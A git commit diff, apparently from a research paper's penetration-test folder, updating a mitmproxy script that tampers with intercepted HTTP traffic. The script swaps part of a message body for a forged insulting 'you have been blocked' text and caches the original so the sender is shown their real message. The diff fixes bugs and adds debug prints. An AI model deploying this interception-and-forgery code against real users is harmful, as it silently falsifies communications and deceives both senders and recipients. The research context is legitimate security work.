35a6cb6f236c5ead4260a92c9cd21c2ff1db3a06
Bin Yong <yongb@usi.ch>
2024-01-28 00:48:14 +0000

    Update mitmattack.py

--- paper/penetration_test/mitmattack.py
+++ paper/penetration_test/mitmattack.py
@@ -3,7 +3,7 @@ from mitmproxy import http
 import logging
 
 hidden_truth={}
-what_others_see="Who do you think you are? How dare you to give me suggestions like this? Your naive ideas will never work. You have been blocked. Never send me emails again."
+what_others_see="Who do you think you are? How dare you to give me suggestions like this? Your naive ideas will never work. You have been blocked. *NEVER* send me emails again."
 
 def request(flow: http.HTTPFlow) -> None:
   if flow.request.text:
@@ -13,13 +13,18 @@ def request(flow: http.HTTPFlow) -> None:
       lines = lines[:3] + [what_others_see] + lines[-2:]
       flow.request.text = "\r\n".join(lines)
   for url, text in hidden_truth.items():
-    if flow.request.url.startswitch(url):
+    print(url, flow.request.url)
+    if flow.request.url.startswith(url):
       setattr(flow, "binyong", text)
+      print(1111)
       break	  
 
 def response(flow: http.HTTPFlow) -> None:
   if hasattr(flow, "spurnge"):
-	hidden_truth[flow.response.text] = "\r\n"join(flow.spurnge)
+    truth = "\r\n".join(flow.spurnge)
+    hidden_truth[flow.response.text.strip()] = truth
+    hidden_truth["https" + flow.response.text.strip()[4:]] = truth
     print(flow.response.text)
   if hasattr(flow, "binyong"):
     flow.response.text = flow.binyong
+    print(flow.response.text)
